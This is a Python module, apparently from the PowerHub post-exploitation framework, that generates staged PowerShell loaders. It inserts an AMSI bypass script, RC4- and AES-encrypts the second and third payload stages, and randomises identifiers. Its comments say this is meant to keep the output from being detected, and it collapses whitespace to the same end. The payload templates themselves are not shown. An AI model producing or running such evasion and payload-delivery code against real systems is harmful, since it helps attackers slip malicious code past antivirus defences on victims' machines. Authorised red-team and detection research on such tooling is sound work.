import base64
import logging
import os
import random
import re
import string

from jinja2 import Environment, FileSystemLoader

from powerhub.tools import encrypt_rc4, encrypt_aes
from powerhub.directories import BASE_DIR
from powerhub.env import powerhub_app as ph_app


log = logging.getLogger(__name__)

symbol_list = {None: None}


def symbol_name(name):
    if name not in symbol_list:
        if ph_app.args.DEBUG:
            # In debug mode, don't obfuscate
            symbol_list[name] = name
        else:
            symbol_list[name] = choose_obfuscated_name()
    return symbol_list[name]


def debug(msg, dbg=False):
    """This is a function for debugging statements in jinja2 templates"""
    if dbg:
        return msg + ";"
    return ""


def choose_obfuscated_name():
    # TODO choose better names
    # the names should not contain too much entropy, or it will be
    # detectable. they should also not be too common or we will risk
    # collisions. they should just blend in perfectly.
    result = None
    length = random.choice(range(4, 8))
    while not result and result in list(symbol_list.values()):
        result = ''.join([random.choice(string.ascii_lowercase)
                          for i in range(length)])
        result = random.choice(string.ascii_uppercase) + result
    return result


# TODO add jinja include_randomize_whitespace
# TODO add jinja powershell decoys

def get_stage(key, amsi_bypass='reflection', jinja_context={}, stage3_files=[], stage3_strings=[]):
    if amsi_bypass:
        assert '/' not in amsi_bypass
        amsi_bypass = os.path.join('powershell', 'amsi', amsi_bypass + '.ps1')
    else:
        amsi_bypass = ''

    context = {
        'symbol_name': symbol_name,
        'key': key,
        'amsibypass': amsi_bypass,
    }
    context.update(jinja_context)

    env = Environment(loader=FileSystemLoader(
        os.path.join(BASE_DIR, 'templates')
    ))

    def rc4encrypt(msg):
        return base64.b64encode(encrypt_rc4(msg.encode(), key)).decode()

    env.filters['rc4encrypt'] = rc4encrypt
    env.filters['debug'] = lambda msg: debug(msg, dbg=ph_app.args.DEBUG)

    stage1_template = env.get_template(os.path.join('powershell', 'stage1.ps1'))

    stage2_template = env.get_template(os.path.join('powershell', 'stage2.ps1'))
    stage2 = stage2_template.render(**context)
    stage2 = encrypt_rc4(stage2.encode(), key)
    stage2 = base64.b64encode(stage2).decode()

    stage3 = []
    for t in stage3_files + stage3_strings:
        if t in stage3_files:
            buffer = open(t, 'r').read()
        else:
            buffer = t
        buffer = encrypt_aes(buffer, key)
        stage3.append(buffer)

    context['stage2'] = stage2
    context['stage3'] = stage3

    result = stage1_template.render(**context)

    if not ph_app.args.DEBUG:
        result = remove_leading_whitespace(result)
        result = remove_blank_lines(result)

    return result


def remove_leading_whitespace(text):
    text = re.sub(r'\s+', ' ', text)
    return text


def remove_blank_lines(text):
    result = [
        line for line in text.splitlines() if line
    ]
    result = '\n'.join(result)
    return result
